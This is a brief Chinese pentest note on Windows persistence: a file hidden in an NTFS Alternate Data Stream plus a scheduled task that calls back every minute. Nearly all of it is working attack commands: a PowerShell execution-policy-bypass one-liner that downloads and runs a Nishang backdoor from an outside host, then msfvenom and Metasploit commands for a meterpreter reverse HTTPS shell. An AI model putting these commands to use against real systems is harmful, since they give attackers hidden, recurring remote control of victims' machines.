	使用ADS创建一个隐藏文件，创建一个计划任务每隔一分钟请求一次攻击。
	>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Backdoors/Invoke-ADSBackdoor.ps1'); Invoke-ADSBackdoor -PayloadURL http://192.168.0.107/ps/Schtasks-Backdoor.ps1 -Arguments 'Invoke-Tasksbackdoor -method nccat -ip 192.168.0.107 -port 12138 -time 1'"

![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/536.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/537.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/538.png)
	生成
	>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.107 LPORT=12138 -f powershell -o /var/www/html/ads
	>use exploit/multi/handler
	>set payload windows/x64/meterpreter/reverse_https
	>run